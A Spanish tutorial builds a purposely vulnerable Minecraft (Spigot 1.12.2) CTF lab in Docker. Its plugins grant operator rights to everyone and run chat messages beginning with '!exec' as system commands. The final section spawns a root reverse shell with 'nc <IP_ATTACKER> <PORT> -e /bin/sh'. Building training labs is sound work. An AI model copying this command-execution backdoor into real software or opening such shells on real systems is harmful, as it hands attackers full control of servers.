---
icon: pickaxe
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Crear Minecraft Vulnerable CTF (Docker)

En este `CTF` lo que vamos a realizar es crear un entorno de `Ubuntu` en un `Docker` en el que instalaremos un `Servidor de Minecraft` de la version `1.12.2` antigua para que sea vulnerable, pero no instalaremos el servidor `Vanilla` si no, instalaremos el de los `Plugins` llamado `Spigot`, crearemos unos `plugins` vulnerables en `JAVA` y los instalaremos en la carpeta `plugins` de donde esta dicho servidor, todo esto en `Docker`.

## Instalación/Configuración de entorno vulnerable

Primero tendremos que importar una imagen vacia de `Ubuntu` en el `docker` de la siguiente forma.

```shell
docker pull ubuntu:latest
```

Una vez echo eso, tendremos que identificar que `ID` tiene.

```shell
docker images
```

Info:

```
REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
ubuntu       latest    bf16bdcff9c9   2 weeks ago   78.1MB
```

Vemos que tiene el `ID` `bf16bdcff9c9` por lo que obtendremos los `3` primeros digitos haciendo lo siguiente:

```shell
docker run -it bf1
```

Con esto obtendremos una `shell` como `root` dentro del `docker` en la imagen de `ubuntu`, ahora tendremos que actualizar el sistema.

```shell
apt update
apt install nano
apt install sudo
apt install wget
apt install -y maven
apt install openjdk-8-jre-headless -y
apt install openjdk-8-jdk git -y
apt install netcat-traditional -y
```

Una vez instalado todo lo necesario, tendremos que descargarnos los archivos necesarios, antes vamos a crear un espacio de trabajo (`workspace`) en la `raiz` del sistema `linux` (`/`).

```shell
mkdir /minecraft
cd /minecraft
```

Echo esto vamos a descargarnos lo necesario.

```shell
wget https://launcher.mojang.com/v1/objects/8494e844e911ea0d63878f64da9dcc21f53a3463/server.jar -O server.jar
wget https://hub.spigotmc.org/jenkins/job/BuildTools/lastSuccessfulBuild/artifact/target/BuildTools.jar
```

El primero archivo es para el servidor `Vanilla` por si lo quisieramos sin `plugins` y el segundo es para el servidor con `plugins`.

Vamos a iniciar primero el servidor `Vanilla` para que cree toda la estructura de archivos que es necesaria para que funcione el servidor, pero antes de hacerlo para que no de error, tendremos que aceptar el `eula` que viene por defecto en `minecraft` de esta forma.

```shell
echo "eula=true" > eula.txt
```

Echo esto iniciaremos el servidor de esta forma.

```shell
java -Xmx1G -Xms1G -jar server.jar nogui
```

Info:

```
[22:23:31] [Server thread/INFO]: Starting minecraft server version 1.12
[22:23:31] [Server thread/INFO]: Loading properties
[22:23:31] [Server thread/INFO]: Default game type: SURVIVAL
[22:23:31] [Server thread/INFO]: Generating keypair
[22:23:31] [Server thread/INFO]: Starting Minecraft server on *:25565
[22:23:32] [Server thread/INFO]: Using epoll channel type
[22:23:32] [Server thread/WARN]: **** SERVER IS RUNNING IN OFFLINE/INSECURE MODE!
[22:23:32] [Server thread/WARN]: The server will make no attempt to authenticate usernames. Beware.
[22:23:32] [Server thread/WARN]: While this makes the game possible to play without internet access, it also opens up the ability for hackers to connect with any username they choose.
[22:23:32] [Server thread/WARN]: To change this, set "online-mode" to "true" in the server.properties file.
[22:23:32] [Server thread/INFO]: Preparing level "world"
[22:23:32] [Server thread/INFO]: Loaded 488 advancements
[22:23:32] [Server thread/INFO]: Preparing start region for level 0
[22:23:33] [Server thread/INFO]: Done (1.160s)! For help, type "help" or "?"
```

Con esto podremos ver que esta funcionando de forma correcta, ahora que se ha generado la estructura de archivos, tendremos que parar el servidor con `Ctrl+C` y modificar el archivo llamado `server.properties` para establecer el que se pueda conectar desde cuentas `No premium`.

```shell
nano /minecraft/server.properties

#Dentro del nano
online-mode=false # Cambiamos de "true" a "false"
```

Lo guardamos y seguiremos con la configuracion.

Ahora tendremos que instalar el servidor en el cual se van a poder implementar los `plugins`, tendremos que hacerlo de esta forma.

```shell
java -jar BuildTools.jar --rev 1.12.2
```

Esto puede tardar un rato largo ya que se esta instalando todo lo necesario para que funcione, una vez que se haya instalado todo, veremos que se han añadido cosas nuevas, entre ellas los siguientes archivos.

```
spigot-1.12.2.jar
CraftBukkit/
Bukkit/
bukkit.yml
....
```

El que nos va a importar es el archivo llamado `spigot-1.12.2.jar` que es el que inicia el servidor de `plugins`, ahora vamos a crear `2` `plugins` vulnerables para que se pueda hacer un `RCE` desde `minecraft`.

Antes tendremos que crear la carpeta `plugins`.

```shell
mkdir /minecraft/plugins
cd /
```

En la `raiz` (`/`) crearemos otra carpeta que sera el espacio de trabajo donde crearemos los `plugins`.

```shell
mkdir minecraft-plugin
cd minecraft-plugin/
```

Echo esto vamos a crear un `plugin` en el que cada vez que se conecte un jugador al servidor le asigne el `OP` de forma inmediata para que pueda ejecutar comandos en `Miencraft`.

```shell
mkdir -p /minecraft-plugin/src/main/java/com/ctf/autoop
mkdir -p /minecraft-plugin/src/main/resources
```

Vamos a crear la clase de `JAVA` la cual va a realizar la funcion que queremos, se va a llamar `AutoOpPlugin.java`.

```shell
cat > src/main/java/com/ctf/autoop/AutoOpPlugin.java << EOF
package com.ctf.autoop;

import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;

public class AutoOpPlugin extends JavaPlugin implements Listener {

    @Override
    public void onEnable() {
        getLogger().info("AutoOpPlugin activado");
        getServer().getPluginManager().registerEvents(this, this);
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        event.getPlayer().setOp(true);
        getLogger().info("Dando OP a " + event.getPlayer().getName());
    }
}
EOF
```

Ahora vamos a crear el archivo `.yml` necesario.

```shell
cat > src/main/resources/plugin.yml << EOF
name: AutoOpPlugin
main: com.ctf.autoop.AutoOpPlugin
version: 1.0
api-version: 1.12
EOF
```

Por ultimo super importante crear el archivo para las dependencias y configuracion de lo demas el archivo llamado `pom.xml`.

```shell
cat > pom.xml << EOF
<project xmlns="http://maven.apache.org/POM/4.0.0" 
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 
         http://maven.apache.org/xsd/maven-4.0.0.xsd">
  <modelVersion>4.0.0</modelVersion>

  <groupId>com.ctf</groupId>
  <artifactId>autoopplugin</artifactId>
  <version>1.0-SNAPSHOT</version>
  <packaging>jar</packaging>

  <name>AutoOpPlugin</name>

  <repositories>
    <repository>
      <id>spigot-repo</id>
      <url>https://hub.spigotmc.org/nexus/content/repositories/snapshots/</url>
    </repository>
  </repositories>

  <dependencies>
    <dependency>
      <groupId>org.spigotmc</groupId>
      <artifactId>spigot-api</artifactId>
      <version>1.12.2-R0.1-SNAPSHOT</version>
      <scope>provided</scope>
    </dependency>
  </dependencies>

  <build>
    <plugins>
      <plugin>
        <groupId>org.apache.maven.plugins</groupId>
        <artifactId>maven-compiler-plugin</artifactId>
        <version>3.8.1</version>
        <configuration>
          <source>1.8</source>
          <target>1.8</target>
        </configuration>
      </plugin>
      <plugin>
        <groupId>org.apache.maven.plugins</groupId>
        <artifactId>maven-jar-plugin</artifactId>
        <version>3.1.0</version>
        <configuration>
          <archive>
            <manifest>
              <addClasspath>true</addClasspath>
              <mainClass>com.ctf.autoop.AutoOpPlugin</mainClass>
            </manifest>
          </archive>
        </configuration>
      </plugin>
    </plugins>
  </build>

</project>
EOF
```

Echo esto lo tendremos que compilar de la siguiente forma:

```shell
mvn clean package
```

Info:

```
...............................<RESTO DE CODIGO>...................................
[INFO] 
[INFO] --- maven-jar-plugin:2.4:jar (default-jar) @ autoopplugin ---
[INFO] Building jar: /minecraft-plugin/target/autoopplugin-1.0-SNAPSHOT.jar
[INFO] ------------------------------------------------------------------------
[INFO] BUILD SUCCESS
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  0.729 s
[INFO] Finished at: 2025-06-17T19:29:04+02:00
[INFO] ------------------------------------------------------------------------
```

Si vemos `BUILD SUCCESS` es que todo ha salido bien, por lo que cuando haya terminado de compilarse veremos el archivo `.jar` compilado en la carpeta `target/`.

```shell
ls -la /minecraft-plugin/target/
```

Info:

```
total 28
drwxr-xr-x 6 root root 4096 Jun 17 19:29 .
drwxr-xr-x 4 root root 4096 Jun 17 19:29 ..
-rw-r--r-- 1 root root 3657 Jun 17 19:29 autoopplugin-1.0-SNAPSHOT.jar
drwxr-xr-x 3 root root 4096 Jun 17 19:29 classes
drwxr-xr-x 3 root root 4096 Jun 17 19:29 generated-sources
drwxr-xr-x 2 root root 4096 Jun 17 19:29 maven-archiver
drwxr-xr-x 3 root root 4096 Jun 17 19:29 maven-status
```

Tendremos que realizar lo siguiente.

```shell
cp /minecraft-plugin/target/autoopplugin-1.0-SNAPSHOT.jar /minecraft/plugins/
```

Una vez que lo hayamos movido a `plugins` ya estaria cargado, pero ahora vamos a crear el ultimo `plugin` el cual es el que puede hacer el `RCE`, por lo que eliminaremos el espacio de trabajo anterior para crearlo de nuevo.

```shell
rm -r /minecraft-plugin
mkdir /minecraft-plugin
mkdir -p /minecraft-plugin/src/main/java/me/vuln/autoexec
mkdir -p /minecraft-plugin/src/main/resources
cd /minecraft-plugin
```

Una vez echo esto crearemos el `pom.xml` super importante.

```shell
nano pom.xml

#Dentro del nano
<project xmlns="http://maven.apache.org/POM/4.0.0" 
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 
         http://maven.apache.org/xsd/maven-4.0.0.xsd">
  <modelVersion>4.0.0</modelVersion>

  <groupId>me.vuln</groupId>
  <artifactId>autoexecplugin</artifactId>
  <version>1.0-SNAPSHOT</version>
  <packaging>jar</packaging>

  <name>AutoExecPlugin</name>

  <repositories>
    <repository>
      <id>spigot-repo</id>
      <url>https://hub.spigotmc.org/nexus/content/repositories/snapshots/</url>
    </repository>
  </repositories>

  <dependencies>
    <dependency>
      <groupId>org.spigotmc</groupId>
      <artifactId>spigot-api</artifactId>
      <version>1.12.2-R0.1-SNAPSHOT</version>
      <scope>provided</scope>
    </dependency>
  </dependencies>

  <build>
    <plugins>
      <plugin>
        <artifactId>maven-compiler-plugin</artifactId>
        <version>3.8.1</version>
        <configuration>
          <source>1.8</source>
          <target>1.8</target>
        </configuration>
      </plugin>
    </plugins>
  </build>
</project>
```

Ahora crearemos la clase vulnerable de `JAVA` que va a permitir la ejecuccion de comandos en el sistema desde `minecraft` (`RCE`).

```shell
nano /minecraft-plugin/src/main/java/me/vuln/autoexec/AutoExecPlugin.java

#Dentro del nano
package me.vuln.autoexec;

import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.BufferedReader;
import java.io.InputStreamReader;

public class AutoExecPlugin extends JavaPlugin implements Listener {

    @Override
    public void onEnable() {
        getLogger().info("AutoExecPlugin habilitado");
        getServer().getPluginManager().registerEvents(this, this);
    }

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {
        String msg = event.getMessage();
        Player player = event.getPlayer();

        // Detecta comando con prefijo !exec
        if (msg.startsWith("!exec ")) {
            event.setCancelled(true); // CANCELA que se muestre el mensaje en el chat

            String command = msg.substring(6); // Quitar "!exec " del mensaje

            try {
                // Ejecutar comando en la consola del servidor
                Process proc = Runtime.getRuntime().exec(command);
                BufferedReader reader = new BufferedReader(new InputStreamReader(proc.getInputStream()));

                StringBuilder output = new StringBuilder();
                String line;

                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }

                proc.waitFor();

                // Enviar salida del comando al jugador que ejecutó el chat
                player.sendMessage("§c[Output]:\n" + output.toString());

            } catch (Exception e) {
                player.sendMessage("§4Error ejecutando comando: " + e.getMessage());
            }
        }
    }
}
```

Y por ultimo crearemos el `.yml` necesario para ello.

```shell
nano /minecraft-plugin/src/main/resources/plugin.yml

#Dentro del nano
name: AutoExecPlugin
main: me.vuln.autoexec.AutoExecPlugin
version: 1.0
api-version: 1.12
```

Ahora echo esto tendremos que compilarlo de esta forma.

```shell
mvn clean package
```

Info:

```
...............................<RESTO DE CODIGO>...................................
[INFO] 
[INFO] --- maven-jar-plugin:2.4:jar (default-jar) @ autoexecplugin ---
[INFO] Building jar: /minecraft-plugin/target/autoexecplugin-1.0-SNAPSHOT.jar
[INFO] ------------------------------------------------------------------------
[INFO] BUILD SUCCESS
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  0.729 s
[INFO] Finished at: 2025-06-17T19:29:04+02:00
[INFO] ------------------------------------------------------------------------
```

Si vemos `BUILD SUCCESS` es que todo ha salido bien, por lo que cuando haya terminado de compilarse veremos el archivo `.jar` compilado en la carpeta `target/`.

```shell
ls -la /minecraft-plugin/target/
```

Info:

```
total 28
drwxr-xr-x 6 root root 4096 Jun 17 19:29 .
drwxr-xr-x 4 root root 4096 Jun 17 19:29 ..
-rw-r--r-- 1 root root 3657 Jun 17 19:29 autoexecplugin-1.0-SNAPSHOT.jar
drwxr-xr-x 3 root root 4096 Jun 17 19:29 classes
drwxr-xr-x 3 root root 4096 Jun 17 19:29 generated-sources
drwxr-xr-x 2 root root 4096 Jun 17 19:29 maven-archiver
drwxr-xr-x 3 root root 4096 Jun 17 19:29 maven-status
```

Tendremos que realizar lo siguiente.

```shell
cp /minecraft-plugin/target/autoexecplugin-1.0-SNAPSHOT.jar /minecraft/plugins/
```

Teniendo ya los `2` archivos en la carpeta `plugins` iniciaremos el servidor para que este funcionando.

```shell
java -Xmx1G -Xms1G -jar spigot-1.12.2.jar nogui
```

Info:

```
............................<RESTO DE CODIGO>.....................................
[22:47:48 INFO]: Max TNT Explosions: 100
[22:47:48 INFO]: Tile Max Tick Time: 50ms Entity max Tick Time: 50ms
[22:47:48 INFO]: Item Merge Radius: 2.5
[22:47:48 INFO]: Item Despawn Rate: 6000
[22:47:48 INFO]: Arrow Despawn Rate: 1200
[22:47:48 INFO]: Allow Zombie Pigmen to spawn from portal blocks: true
[22:47:48 INFO]: View Distance: 10
[22:47:48 INFO]: Experience Merge Radius: 3.0
[22:47:48 INFO]: Zombie Aggressive Towards Villager: true
[22:47:48 INFO]: Nerfing mobs spawned from spawners: false
[22:47:48 INFO]: Preparing start region for level 0 (Seed: 7388324508683529606)
[22:47:49 INFO]: Preparing start region for level 1 (Seed: 7388324508683529606)
[22:47:49 INFO]: Preparing start region for level 2 (Seed: 7388324508683529606)
[22:47:49 INFO]: [AutoOpPlugin] Enabling AutoOpPlugin v1.0
[22:47:49 INFO]: [AutoOpPlugin] AutoOpPlugin activado
[22:47:49 INFO]: [AutoExecPlugin] Enabling AutoExecPlugin v1.0
[22:47:49 INFO]: [AutoExecPlugin] AutoExecPlugin habilitado
[22:47:49 INFO]: Server permissions file permissions.yml is empty, ignoring it
[22:47:49 INFO]: Done (1.687s)! For help, type "help" or "?"
```

Con esto veremos que esta funcionando el servidor y que ya esta encendido, tambien para comprobar que los `plugins` estan iniciandose de forma correcta lo veremos en esta parte.

```
[22:47:49 INFO]: [AutoOpPlugin] Enabling AutoOpPlugin v1.0
[22:47:49 INFO]: [AutoOpPlugin] AutoOpPlugin activado
[22:47:49 INFO]: [AutoExecPlugin] Enabling AutoExecPlugin v1.0
[22:47:49 INFO]: [AutoExecPlugin] AutoExecPlugin habilitado
```

Vemos que se esta iniciando bien, antes vamos a comprobar que el puerto de `JAVA` de `Minecraft` se esta exponiendo fuera en el puerto por defecto.

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP> # Para saber los puertos
nmap -sCV -p25565 <IP> # Informacion detallada de los puertos
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-17 16:50 EDT
Nmap scan report for 172.17.0.2
Host is up (0.000078s latency).

PORT      STATE SERVICE   VERSION
25565/tcp open  minecraft Minecraft 1.12.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.61 seconds
```

Vemos que se esta exponiendo bien y que se esta identificando de forma correcta, por lo que vamos a pasar a la parte de instalarnos `Minecraft` para poder conectarnos al servidor.

## Instalación de Minecraft (Gratis)

Vamos a ir al siguiente enlace en la pagina del `TLauncher` de `Minecraft`, es para jugar `Minecraft` gratis.

URL = [Download Minecraft TLauncher](https://tlauncher.org/)

<figure><img src="../.gitbook/assets/Captura de pantalla 2025-06-17 225422.png" alt=""><figcaption></figcaption></figure>

Le daremos a `TLauncher for Linux` para que nos lo descargue, esto nos descargara un `.zip` el cual vamos a extraer de esta forma.

```shell
cd /home/<USERNAME>/Download
unzip <FILE>.zip
```

Una vez extraido veremos lo siguiente en la carpeta llamada `TLauncher.v16`:

```shell
cd TLauncher.v16/
ls -la
```

Info:

```
total 9904
drwxrwxr-x 2 kali kali     4096 Jun 17 12:50 .
drwxr-xr-x 3 kali kali     4096 Jun 17 16:54 ..
-rw-rw-r-- 1 kali kali     2198 Dec 10  2024 README-EN.txt
-rw-rw-r-- 1 kali kali     3235 Dec 10  2024 README-RUS.txt
-rw-rw-r-- 1 kali kali 10121689 May  4 06:37 TLauncher.jar
```

Lo importante es el archivo `TLauncher.jar` que es el que inicia `Minecraft` por lo que tendremos que ejecutarlo de esta forma.

```shell
java -jar tlauncher.jar
```

Esto instalara `Minecraft` y abrira el launcher para iniciarlo, dentro del mismo tendremos que elegir el nombre de usuario que puede ser cualquiera y muy importante la version, tendremos que elegir la llamada `release 1.12.2` y darle a `Install`.

Eso instalara todo lo necesario para jugarla, una vez que se haya instalado todo nos pondra `Enter the game` le daremos y despues de un rato estaremos dentro del menu de `Minecraft`, nos iremos a la opcion llamada `Multiplayer` y dentro del mismo configuraremos el servidor de `Miencraft` desde donde esta corriendo de nuestro `docker`.

Le daremos al boton llamado `Add Server` y dentro del mismo veremos el `Server Name` y el `Server Address` el que nos interesa es configurar el `Server Adderess` por lo que tendremos que poner la `IP` del `docker` junto con el puerto que es el `25565` quedando de esta forma:

<figure><img src="../.gitbook/assets/Captura de pantalla 2025-06-17 230241.png" alt=""><figcaption></figcaption></figure>

Le daremos a `Done` y si refrescamos tendremos que ver el server activo asi:

<figure><img src="../.gitbook/assets/Captura de pantalla 2025-06-17 230326.png" alt=""><figcaption></figcaption></figure>

Ahora seleccionaremos el servidor y le daremos al boton llamado `Join Server` esto nos metera dentro del mundo de `Minecraft` del servidor.

## Explotacion de plugins en Minecraft

Una vez dentro del mundo vamos a probar a listar los `plugins` de esta forma desde `Minecraft`.

```shell
/pl
```

Info:

```
Plugins (2): AutoOpPlugin, AutoExecPlugin
```

Vemos que los esta detectando de forma correcta, ahora si probamos a ejecutar el siguiente comando que hemos configurado para que se pueda ejecutar comandos del sistema de esta forma en `Minecraft`.

```shell
!exec whoami
```

Info:

<figure><img src="../.gitbook/assets/Captura de pantalla 2025-06-17 230640.png" alt=""><figcaption></figcaption></figure>

Vemos que se esta ejecutando de forma correcta, por lo que vamos a probar a generarnos una `reverse shell` de esta forma.

```shell
!exec nc <IP_ATTACKER> <PORT> -e /bin/sh
```

Antes de ejecutarlo tendremos que ponernos a la escucha desde nuestra maquina `host`.

```shell
nc -lvnp <IP>
```

Estando a la escucha si ejecutamos el comando anterior desde `Minecraft` y volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.177.129] from (UNKNOWN) [172.17.0.2] 47064
whoami
root
```

Vemos que hemos obtenido de forma exitosa una `shell` desde la maquina victima mediante un `plugin` vulnerable desde `Minecraft`.
